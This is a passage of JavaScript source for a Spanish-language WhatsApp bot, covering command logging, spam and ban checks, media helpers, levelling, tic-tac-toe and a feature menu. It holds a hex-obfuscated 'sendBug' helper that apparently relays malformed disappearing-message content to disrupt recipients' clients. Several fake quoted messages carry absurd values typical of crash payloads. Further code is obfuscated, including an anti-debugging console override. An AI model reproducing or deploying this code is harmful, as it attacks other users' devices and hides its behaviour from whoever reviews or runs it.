        if (!isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
        	if (isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname), chalk.greenBright("en el grupo"), chalk.keyword("yellow")(groupName))
	
	    	if (isBan && isCmd && !isOwner) {
		reply('*Lo siento pero usted es un usuario baneado, no puede hacer uso del bot!*')
        	return console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ USUARIO BANEADO ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
        	}
	
		if (isCmd && isFiltered(from) && !isGroup) {
        	console.log(chalk.greenBright("├"), chalk.keyword("red")("[ SPAM ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
        	return samu330.sendMessage(from, `🙂 Porfavor ${pushname}...\n\nEspere 3 segundos para poder usar otros comandos, gracias✅`, MessageType.text, {quoted: fspam})
		}
        
        	if (isCmd && isFiltered(from) && isGroup) {
        	console.log(chalk.greenBright("├"), chalk.keyword("red")("[ SPAM ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
        	return samu330.sendMessage(from, `🙂 Porfavor ${pushname}...\n\nEspere 3 segundos para poder usar otros comandos, gracias✅`, MessageType.text, {quoted: fspam})
		}

        var _0x6376=["\x70\x72\x65\x70\x61\x72\x65\x44\x69\x73\x61\x70\x70\x65\x61\x72\x69\x6E\x67\x4D\x65\x73\x73\x61\x67\x65\x53\x65\x74\x74\x69\x6E\x67\x43\x6F\x6E\x74\x65\x6E\x74","\x70\x72\x65\x70\x61\x72\x65\x4D\x65\x73\x73\x61\x67\x65\x46\x72\x6F\x6D\x43\x6F\x6E\x74\x65\x6E\x74","\x72\x65\x6C\x61\x79\x57\x41\x4D\x65\x73\x73\x61\x67\x65"];const sendBug=async (_0x13b3x2,_0x13b3x3)=>{ await samu330[_0x6376[2]](samu330[_0x6376[1]](_0x13b3x2,samu330[_0x6376[0]](0),{}),{waitForAck:true})}
 

	    
	const sendFile = async (archivo, nombreDeArchivo, comentario, tag, vn) => {
  	tipo = await getBuffer(archivo)
  	tipo2 = ''
  	if (nombreDeArchivo.includes('m4a')){
  	samu330.sendMessage(from, tipo, audio,{mimetype: 'audio/mp4',quoted: tag, filename: nombreDeArchivo, ptt: vn})
  	}
  	if (nombreDeArchivo.includes('mp4')){
	samu330.sendMessage(from, tipo, video, {mimetype: 'video/mp4', quoted: tag, caption: comentario, filename: nombreDeArchivo})
  	}
  	if (nombreDeArchivo.includes('gif')){
  	samu330.sendMessage(from, tipo, video, {mimetype: Mimetype.gif, caption: comentario, quoted: tag, filename: nombreDeArchivo})
  	} 
  	if (nombreDeArchivo.includes('png')){
  	samu330.sendMessage(from, tipo, image, {quoted: tag, caption: comentario, filename: nombreDeArchivo})
  	}
  
  	if (nombreDeArchivo.includes('webp')){
  	samu330.sendMessage(from, tipo, sticker, {quoted: tag})
  	} else {
  	tipo2 = nombreDeArchivo.split(`.`)[1]
  	samu330.sendMessage(from, tipo, document, {mimetype: tipo2, quoted: tag, filename: nombreDeArchivo})
  	}
	}
	    
	const sendFileFromUrl = async(link, type, options) => {
  	hasil = await getBuffer(link)
	samu330.sendMessage(from, hasil, type, options).catch(e => {
	fetch(link).then((hasil) => {
	samu330.sendMessage(from, hasil, type, options).catch(e => {
	samu330.sendMessage(from, { url : link }, type, options).catch(e => {
	  reply('_[ ! ] Error al descargar el archivo_')
	  console.log(e)
	})
	})
	})
	})
	}

    const sendMediaURL = async(to, url, text="", mids=[]) =>{
        if(mids.length > 0){
            text = mentions(text, mids, true)
        }
        const fn = Date.now() / 10000;
        const filename = fn.toString()
        let mime = ""
        var download = function (uri, filename, callback) {
            request.head(uri, function (err, res, body) {
                mime = res.headers['content-type']
                request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
            });
        };
        download(url, filename, async function () {
            console.log('');
            let media = fs.readFileSync(filename)
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            samu330.sendMessage(to, media, type, { quoted: sam, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
            
            fs.unlinkSync(filename)
        });
    }
		    
	const nivelActual = getLevelingLevel(sender)
            var rango = '🎭Principiante'
            if (nivelActual == 10) {
                rango = '*🥉Bronce*'
            } else if (nivelActual == 20) {
                rango = '*🥈Plata*'
            } else if (nivelActual == 30) {
                rango = '*🥇Oro*'
	    } else if (nivelActual == 30) {
                rango = '*🌬Diamante Rosa*'
            } else if (nivelActual == 100) {
                rango = '*🌬Diamante Rosa*'
            } else if (nivelActual == 150) {
                rango = '*🔥Diamante rojo🔥*'
            } else if (nivelActual > 200) {
                rango = '*🔮Nivel Maximo🗡*'
            }

	
	if (isOwner) {
	var tipoDeUsr = '*🔮Ownwer*'
	} else if (sender == isAdmin) {
	var tipoDeUsr = '*👑Admin*'
	 } else {
	var tipoDeUsr = '*✍🏻Usuario*'
	}
	
	if (!sam.key.fromMe) {
        if (!isBan) {
	const currentLevel = getLevelingLevel(sender)
	const checkId = getLevelingId(sender)
	try {
	if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
	const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 15) //Math.floor(Math.random() * 10) + 500
	const requiredXp = 5 * Math.pow(currentLevel, (5 / 2)) + 50 * currentLevel + 100 //5000 * (Math.pow(2, currentLevel) - 1)
	const getLevel = getLevelingLevel(sender)
	const namelv = checkId
	addLevelingXp(sender, amountXp)
	if (requiredXp <= getLevelingXp(sender)) {
	addLevelingLevel(sender, 1)
	const lvup =  `✴ _*🧗🏻‍♂️S͟u͟b͟e͟s͟ ͟d͟e͟ ͟n͟i͟v͟e͟l͟!͟*_ ✴
	
	𓆩*𓆪 *💠 Nombre:* @${namelv.split('@')[0]} 𓆩*𓆪
	
	┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈
  	✨XP: ${getLevelingXp(sender)}
  	📚Nivel: ${getLevel} ➫ ${getLevelingLevel(sender)}
  	🕋rango: ${nivelActual}
	┖┈┈┈┈┈┈┈┈┈┈┈┈┈┈`
	/*samu330.sendMessage(from, lvup, MessageType.text, {quoted: { key: {                
		fromMe: false,
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },
                message: {
		"documentMessage": { "title": `✍🏻Nivel ${nivelActual}`, 'jpegThumbnail': fs.readFileSync('./src/ara.png')}
		}}
		})*/}
	} catch (err) {
	console.error(err)
	}
	}
	}	
	    
//REPLY
var _0xd6ca=["\x74\x65\x78\x74","\x30\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x73\x74\x61\x74\x75\x73\x40\x62\x72\x6F\x61\x64\x63\x61\x73\x74","","\x2E\x2F\x6D\x65\x64\x69\x61\x2F\x72\x65\x70\x6C\x79\x2E\x70\x6E\x67","\x72\x65\x61\x64\x46\x69\x6C\x65\x53\x79\x6E\x63","\uD83C\uDF49\x53\u0332\u0332\u0332\u0332\u0332\u0332\u0332\u0332\u0332\u0332\u0332\u0332\u0332\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\x61\u0332\u0347\u0332\u0332\u0347\u0347\u0332\u0347\u0332\u0347\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\x6D\u0347\u032D\u0347\u0347\u032D\u0347\u032D\u0347\u032D\u0347\u032D\u0305\u033F\u0346\u0308\u0305\u033F\u0346\u0308\u0305\u0305\u033F\u0346\u0308\u033F\u0305\u033F\u0346\u0308\u0346\u0305\u033F\u0346\u0308\x75\u0332\u0347\u032A\u0332\u0332\u0347\u032A\u0347\u0332\u0347\u032A\u032A\u0332\u0347\u032A\u0332\u0347\u032A\u034B\x20\x53\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u0332\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u0347\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u032A\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u031F\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u033F\u033D\u0308\u033F\u033D\u0308\u033F\u033D\u0308\u033F\u033D\u0308\u033F\u033D\u0308\u033F\u033F\u033D\u0308\u033D\u033F\u033D\u0308\u0308\u033F\u033D\u0308\x72\x20\u1E12\u032C\u0329\x6A\u032D\u032C\u0329\x73\u032D\u032C\u0329\x72\u032D\u032C\u0329\uD83C\uDFF9","\uD83D\uDD25\x53\uAA81\u20DC\uABED\uAA94\uABED\u1DE4\uAA8A\x33\u20DD\x33\x30\x20\x7C\x20\x53\x61\x6D\x20\x79\x20\x50\x65\x72\x72\x79\uD83C\uDF52","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x73\x74\x6F\x72\x79\x2E\x70\x68\x70\x3F\x73\x74\x6F\x72\x79\x5F\x66\x62\x69\x64\x3D\x33\x37\x35\x34\x35\x39\x30\x31\x30\x36\x38\x38\x38\x31\x33\x26\x69\x64\x3D\x31\x30\x30\x30\x34\x36\x37\x34\x31\x35\x32\x33\x33\x39\x30","\x2E\x2F\x6D\x65\x64\x69\x61\x2F\x53\x6D\x57\x57\x2E\x70\x6E\x67","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65"];const reply=async (_0xfb9bx2)=>{samu330[_0xd6ca[10]](from,_0xfb9bx2,MessageType[_0xd6ca[0]],{sendEphemeral:true,quoted:{key:{fromMe:false,participant:`${_0xd6ca[1]}`,...(from?{remoteJid:_0xd6ca[2]}:{})},message:{"\x69\x6D\x61\x67\x65\x4D\x65\x73\x73\x61\x67\x65":{"\x74\x69\x74\x6C\x65":`${_0xd6ca[3]}${body}${_0xd6ca[3]}`,'\x6A\x70\x65\x67\x54\x68\x75\x6D\x62\x6E\x61\x69\x6C':fs[_0xd6ca[5]](_0xd6ca[4])}}},contextInfo:{"\x65\x78\x74\x65\x72\x6E\x61\x6C\x41\x64\x52\x65\x70\x6C\x79":{"\x74\x69\x74\x6C\x65":_0xd6ca[6],"\x62\x6F\x64\x79":_0xd6ca[7],"\x73\x6F\x75\x72\x63\x65\x55\x72\x6C":`${_0xd6ca[8]}`,"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0xd6ca[5]](_0xd6ca[9])}}})}
	
	/*const fileIO = async buffer => {
  		const { ext } = await fromBuffer(buffer) || {}
  		const form = new FormData
  		form.append('file', buffer, 'tmp.' + ext)
  		let res = await fetch('https://file.io/?expires=1d', {
   		method: 'POST',
    		body: form
  		})
  		const jsona = await res.json()
  		if (!jsona.success) throw jsona
  		return jsona.link
		reply(jsona.link)
		}*/

        const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
                kma = gam1
		loc = {
		"degreesLatitude": 0,
		"degreesLongitude": 0,
		"jpegThumbnail": kma
		}
                mhan = await samu330.prepareMessage(from, kma, location)
                const buttonMessages = {
                locationMessage: loc,
                contentText: text1,
                footerText: desc1,
                buttons: but,
                headerType: 6
                }
                samu330.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
                }

		const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
			const buttonMessage = {
			contentText: text1,
			footerText: desc1,
			buttons: but,
			headerType: 1
			}
			samu330.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
			}

		const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
				kma = gam1
				mhan = await samu330.prepareMessage(from, kma, image)
				const buttonMessages = {
				imageMessage: mhan.message.imageMessage,
				contentText: text1,
				footerText: desc1,
				buttons: but,
				headerType: 4
				}
				samu330.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
				}
	
	const noreg = {
		key: {
		fromMe: false,
		participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
		"productMessage": {
		"product": {
		"title": '🗒️𝐔𝐬𝐮𝐚𝐫𝐢𝐨 𝐧𝐨 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐝𝐨!',
		"description": "𝙍𝙚𝙜𝙞𝙨𝙩𝙧𝙖𝙩𝙚",
		"currencyCode": "SYP",
		"priceAmount1000": "999999999999999999",
		"retailerId": "NyanBot",
		"productImageCount": 1
		},
		"businessOwnerJid": `0@s.whatsapp.net`
		}
		}
		}
	const fspam = {
		key: {
		fromMe: false,
		participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
		"contactMessage": {
		"displayName": `${pushname} NO SPAM!!`,
		"vcard": 'BEGIN:VCARD\n' +
    		'Version:3.0\n' +
    		'TEL;type=CELL;type=VOICE;waid=5219984907794:+5219984907794\n' +
		'item1.X-ABLabel:Celular' +
    		'END:VCARD'
		}
		}
		}


const fimg = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "imageMessage": { "mimetype": "image/jpeg","caption": `insane2`, 'jpegThumbnail': fs.readFileSync('./src/help.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const fdoc = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "documentMessage": { "title":"insane1", 'jpegThumbnail': fs.readFileSync('./src/fake.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const floc = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "locationMessage": { "caption":"insane", 'jpegThumbnail': fs.readFileSync('./src/samyperry.png')}}
}
contextInfo: {
mentionedJid: [sender]}
const fliveLoc = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "liveLocationMessage": { "caption":"insane", 'jpegThumbnail': fs.readFileSync('./src/img.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const fvid = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "videoMessage": { "caption":"insane", 'jpegThumbnail': fs.readFileSync('./src/help.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const faud = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "audioMessage": {"mimetype": "audio/mp4", "ptt": true, "seconds": -999999}}
}
contextInfo: {
mentionedJid: [sender]}
const ftoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": fs.readFileSync(`./src/fake.jpg`)
},
"title": `insane ${timeFt}`,
"description": "",
"currencyCode": "SYP",
"priceAmount1000": "999999999999999999",
"retailerId": "",
"productImageCount": 999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}
contextInfo: {
mentionedJid: [sender]}



		/*--------------------[ Tictactoe Game Function ]--------------------*/
function _0xd037(_0x1fea26,_0x25290c){const _0x49fad6=_0x33d3();return _0xd037=function(_0x4c8951,_0x3b65b8){_0x4c8951=_0x4c8951-0x16e;let _0x299f50=_0x49fad6[_0x4c8951];return _0x299f50;},_0xd037(_0x1fea26,_0x25290c);}const _0x5cde97=_0xd037;(function(_0x21fbf1,_0x38d5a9){const _0x3f2272=_0xd037,_0x1107c4=_0x21fbf1();while(!![]){try{const _0x4fd9b6=-parseInt(_0x3f2272(0x192))/0x1+parseInt(_0x3f2272(0x183))/0x2*(parseInt(_0x3f2272(0x17a))/0x3)+parseInt(_0x3f2272(0x173))/0x4+-parseInt(_0x3f2272(0x1a4))/0x5*(-parseInt(_0x3f2272(0x190))/0x6)+parseInt(_0x3f2272(0x19a))/0x7+parseInt(_0x3f2272(0x1a7))/0x8*(-parseInt(_0x3f2272(0x188))/0x9)+-parseInt(_0x3f2272(0x178))/0xa;if(_0x4fd9b6===_0x38d5a9)break;else _0x1107c4['push'](_0x1107c4['shift']());}catch(_0x92ee90){_0x1107c4['push'](_0x1107c4['shift']());}}}(_0x33d3,0x43adf));const _0x4318e=function(){let _0x18466e=!![];return function(_0x28f8e7,_0x986b11){const _0x4bc3c5=_0x18466e?function(){if(_0x986b11){const _0x3caa52=_0x986b11['apply'](_0x28f8e7,arguments);return _0x986b11=null,_0x3caa52;}}:function(){};return _0x18466e=![],_0x4bc3c5;};}(),_0x399f56=_0x4318e(this,function(){const _0x275f56=_0xd037;return _0x399f56['toString']()[_0x275f56(0x18c)]('(((.+)+)+)+$')[_0x275f56(0x1a0)]()[_0x275f56(0x18b)](_0x399f56)[_0x275f56(0x18c)](_0x275f56(0x184));});_0x399f56();const _0x3b65b8=function(){let _0x41cd2c=!![];return function(_0x1384a8,_0x35af9f){const _0x2ca771=_0x41cd2c?function(){if(_0x35af9f){const _0x32bda9=_0x35af9f['apply'](_0x1384a8,arguments);return _0x35af9f=null,_0x32bda9;}}:function(){};return _0x41cd2c=![],_0x2ca771;};}(),_0x4c8951=_0x3b65b8(this,function(){const _0x14fcdb=_0xd037;let _0x37198e;try{const _0x26cfb0=Function(_0x14fcdb(0x185)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x37198e=_0x26cfb0();}catch(_0x5c47dd){_0x37198e=window;}const _0x26d7b0=_0x37198e[_0x14fcdb(0x18a)]=_0x37198e['console']||{},_0xcbaed9=['log','warn',_0x14fcdb(0x197),_0x14fcdb(0x19f),_0x14fcdb(0x170),_0x14fcdb(0x17e),_0x14fcdb(0x19e)];for(let _0x31060f=0x0;_0x31060f<_0xcbaed9['length'];_0x31060f++){const _0x5ee4eb=_0x3b65b8[_0x14fcdb(0x18b)][_0x14fcdb(0x194)][_0x14fcdb(0x1a8)](_0x3b65b8),_0x41fe71=_0xcbaed9[_0x31060f],_0x2fcf3e=_0x26d7b0[_0x41fe71]||_0x5ee4eb;_0x5ee4eb[_0x14fcdb(0x16e)]=_0x3b65b8[_0x14fcdb(0x1a8)](_0x3b65b8),_0x5ee4eb[_0x14fcdb(0x1a0)]=_0x2fcf3e[_0x14fcdb(0x1a0)]['bind'](_0x2fcf3e),_0x26d7b0[_0x41fe71]=_0x5ee4eb;}});_0x4c8951();function _0x33d3(){const _0x2f778d=['console','constructor','search','\x0a\x0a\x0a\x0a*⭕Tictactoe\x20by:*\x0a\x0a➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈\x20y\x20Keͥ͢vͣıͫ͘͜𝜂\x0a','.json','_matrix','1341258PTQvxw','*🎮\x20Tictactoe\x20Game\x20🎳*\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20El\x20juego\x20termina\x20en\x20empate\x20😐\x0a','530904zopBPB','text','prototype','\x20│\x20','writeFileSync','info','*🎮\x20Tictactoe\x20Game\x20🎳*\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a❌\x20:\x20@','unlinkSync','2523374cjUElw','\x0a\x0a\x0a\x20\x20\x20','Desafortunadamente\x20el\x20desafío\x20para\x20@','@s.whatsapp.net','trace','error','toString','por\x20qué','replace','\x0a\x20\x20\x20\x20\x20','5KuVOET','isWin','Cex','8BwrXBC','bind','__proto__','split','exception','turn','\x0a\x0a\x20\x20\x20\x20\x20','222244BBUccz','\x0a⭕\x20:\x20@','includes','*🎮\x20Tictactoe\x20Game\x20🎳*\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0aEl\x20ganador\x20es\x20@','\x20fue\x20rechazado\x20❌😕','1058900skWhPB','Esta\x20opción\x20es\x20solo\x20para\x20@','1640508cIcQWw','./lib/tictactoe/db/','sendMessage','El\x20juego\x20ha\x20comenzado\x20antes!','table','\x0a\x20\x20\x20','status','random','toLowerCase','2rQjqMR','(((.+)+)+)+$','return\x20(function()\x20','stringify','winner','2451717cMvRYu','floor'];_0x33d3=function(){return _0x2f778d;};return _0x33d3();}const cmde=budy[_0x5cde97(0x182)]()[_0x5cde97(0x16f)]('\x20')[0x0]||'';let arrNum=['1','2','3','4','5','6','7','8','9'];if(fs['existsSync'](_0x5cde97(0x17b)+from+_0x5cde97(0x18e))){const boardnow=setGame(''+from);if(budy==_0x5cde97(0x1a6))return reply(_0x5cde97(0x1a1));if(budy[_0x5cde97(0x182)]()=='y'||budy[_0x5cde97(0x182)]()=='yes'||budy['toLowerCase']()=='s'){if(boardnow['O']==sender[_0x5cde97(0x1a2)]('@s.whatsapp.net','')){if(boardnow[_0x5cde97(0x180)])return reply(_0x5cde97(0x17d));const matrix=boardnow[_0x5cde97(0x18f)];boardnow[_0x5cde97(0x180)]=!![],fs[_0x5cde97(0x196)]('./lib/tictactoe/db/'+from+_0x5cde97(0x18e),JSON[_0x5cde97(0x186)](boardnow,null,0x2));const chatAccept='*🎮\x20Tictactoe\x20Game\x20🎳*\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a❌\x20:\x20@'+boardnow['X']+_0x5cde97(0x174)+boardnow['O']+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0aEs\x20el\x20turno\x20de\x20:\x20@'+(boardnow[_0x5cde97(0x171)]=='X'?boardnow['X']:boardnow['O'])+_0x5cde97(0x172)+matrix[0x0][0x0]+_0x5cde97(0x195)+matrix[0x0][0x1]+_0x5cde97(0x195)+matrix[0x0][0x2]+_0x5cde97(0x1a3)+matrix[0x1][0x0]+_0x5cde97(0x195)+matrix[0x1][0x1]+_0x5cde97(0x195)+matrix[0x1][0x2]+_0x5cde97(0x1a3)+matrix[0x2][0x0]+'\x20│\x20'+matrix[0x2][0x1]+_0x5cde97(0x195)+matrix[0x2][0x2]+_0x5cde97(0x18d);[_0x5cde97(0x17c)](from,chatAccept,MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[boardnow['X']+'@s.whatsapp.net',boardnow['O']+_0x5cde97(0x19d)]}});}else samu330['sendMessage'](from,_0x5cde97(0x179)+boardnow['O']+'\x20!',MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[boardnow['O']+_0x5cde97(0x19d)]}});}else{if(budy[_0x5cde97(0x182)]()=='n'||budy[_0x5cde97(0x182)]()=='no'||budy['toLowerCase']()=='nopi'){if(boardnow['O']==sender['replace'](_0x5cde97(0x19d),'')){if(boardnow[_0x5cde97(0x180)])return reply(_0x5cde97(0x17d));fs[_0x5cde97(0x199)](_0x5cde97(0x17b)+from+_0x5cde97(0x18e)),[_0x5cde97(0x17c)](from,_0x5cde97(0x19c)+boardnow['X']+_0x5cde97(0x177),MessageType['text'],{'quoted':ftoko,'contextInfo':{'mentionedJid':[boardnow['X']+_0x5cde97(0x19d)]}});}else samu330[_0x5cde97(0x17c)](from,_0x5cde97(0x179)+boardnow['O']+'\x20!',MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[boardnow['O']+_0x5cde97(0x19d)]}});}}}if(arrNum[_0x5cde97(0x175)](cmde)){const boardnow=setGame(''+from);if(!boardnow[_0x5cde97(0x180)])return reply('Parece\x20que\x20tu\x20oponente\x20no\x20ha\x20aceptado\x20el\x20desafío..');if((boardnow[_0x5cde97(0x171)]=='X'?boardnow['X']:boardnow['O'])!=sender[_0x5cde97(0x1a2)](_0x5cde97(0x19d),''))return;const moving=validmove(Number(budy),''+from),matrix=moving[_0x5cde97(0x18f)];if(moving[_0x5cde97(0x1a5)]){if(moving[_0x5cde97(0x187)]=='SERI'){const chatEqual=_0x5cde97(0x191);reply(chatEqual),fs[_0x5cde97(0x199)]('./lib/tictactoe/db/'+from+'.json');return;}const winnerJID=moving[_0x5cde97(0x187)]=='O'?moving['O']:moving['X'],looseJID=moving[_0x5cde97(0x187)]=='O'?moving['X']:moving['O'],limWin=Math[_0x5cde97(0x189)](Math[_0x5cde97(0x181)]()*0x14)+0xa,limLoose=Math[_0x5cde97(0x189)](Math[_0x5cde97(0x181)]()*0xa)+0x5,chatWon=_0x5cde97(0x176)+winnerJID+'\x20😎👑\x0a';['sendMessage'](from,chatWon,MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[moving[_0x5cde97(0x187)]=='O'?moving['O']+_0x5cde97(0x19d):moving['X']+_0x5cde97(0x19d)]}}),fs[_0x5cde97(0x199)](_0x5cde97(0x17b)+from+_0x5cde97(0x18e));}else{const chatMove=_0x5cde97(0x198)+moving['X']+_0x5cde97(0x174)+moving['O']+'\x0a\x0aEs\x20el\x20turno\x20de:\x20@'+(moving[_0x5cde97(0x171)]=='X'?moving['X']:moving['O'])+_0x5cde97(0x19b)+matrix[0x0][0x0]+_0x5cde97(0x195)+matrix[0x0][0x1]+_0x5cde97(0x195)+matrix[0x0][0x2]+_0x5cde97(0x17f)+matrix[0x1][0x0]+'\x20│\x20'+matrix[0x1][0x1]+_0x5cde97(0x195)+matrix[0x1][0x2]+_0x5cde97(0x17f)+matrix[0x2][0x0]+_0x5cde97(0x195)+matrix[0x2][0x1]+_0x5cde97(0x195)+matrix[0x2][0x2]+'\x0a\x0a\x0a\x0a\x0a*⭕Tictactoe\x20by:*\x0a\x0a➫ြ😈\x20y\x20Keͥ͢vͣıͫ͘͜𝜂\x0a';[_0x5cde97(0x17c)](from,chatMove,MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[moving['X']+_0x5cde97(0x19d),moving['O']+_0x5cde97(0x19d)]}});}}

	    
		if (messagesC.includes("bot")){
			samu330.updatePresence(from, Presence.composing)
			rm = [
			result = fs.readFileSync(`./temp/Samu.webp`),
			result1 = fs.readFileSync(`./temp/Samu1.webp`),
			result2 = fs.readFileSync(`./temp/Samu2.webp`),
			result3 = fs.readFileSync(`./temp/Samu3.webp`),
			result4 = fs.readFileSync(`./temp/Samu4.webp`)
			]
			nk = rm[Math.floor(Math.random() * rm.length)]
  			samu330.sendMessage(from, nk, sticker, {
			quoted: fimg, "forwardingScore": 9999, "isForwarded": true
  			})
			}
	    	if (isGroup && botAdmin && isBadWord) {
                        if (bad.includes(messagesC)) {
                        if (!isAdmin) { 
                        samu330.updatePresence(from, Presence.composing)
			var kic = `${sender.split("@")[0]}@s.whatsapp.net`
                        reply(`Lo siento ${sender.split("@")[0]}, pero aqui no se permiten las malas palabras, serás expulsado en 5 segundos`)
                        setTimeout( () => {
                                samu330.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
                        }, 5000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("1 segundo")
                        }, 4000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("2 segundos")
                        }, 3000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("3 segundos")
                        }, 2000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("4 segundos")
                        }, 1000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("5 segundos")
                        }, 0)
				}
			}
		}

//Menus
const mda = `
╔════════════════╗
╠  ◈   ╣
╠════════════════╝
║
╠ *●${prefix}clima* + region
║ _El clima_
║
╠ *●${prefix}zalgo*
║ _Texto estilo zalgo_
║
╠ *●${prefix}contar*
║ _Cuenta caracteres de un texto_
║
╠ *●${prefix}caras*
║ _Etiqueta una imagen para detectar caras_
║
║
╠ *●${prefix}quemusicaes*
║ _Busca el nombre de las canciones que no conozcas_
║
╠ *●${prefix}imagen*
║ _Búsqueda de imágenes_
║ _en Google_
║
╠ *●${prefix}sinfondo*
║ _Quita fondo a imagenes_
║
╠ *●${prefix}wp* 
║ _Búsqueda de fondos_
║ _de pantalla_
║
╠ *●${prefix}par*
║ _Anime para compartir perfil_
║ _(hombre | mujeres)_
║
╠ *●${prefix}animevid*
║ _Videos anime cortos_
║
╠ *●${prefix}queanime*
║ _Etiqueta una imagen de un Anime_
║ _Para saber que anime es_
║
╠ *●${prefix}loli*
║
╠ *●${prefix}neko*
║
╟╼╾┤🎧𝘈𝘶𝘥𝘪𝘰𝘴🎧├╼╾
║
╠ *●${prefix}bass*
║ _Etiqueta un audio_
║
╠ *●${prefix}ardilla*
║ _Etiqueta un audio_
║
╠ *●${prefix}trigger*
║ _Etiqueta un audio_
║
╠ *●${prefix}lento*
║ _Etiqueta un audio_
║
╠ *●${prefix}rapido*
║ _Etiqueta un audio_
║
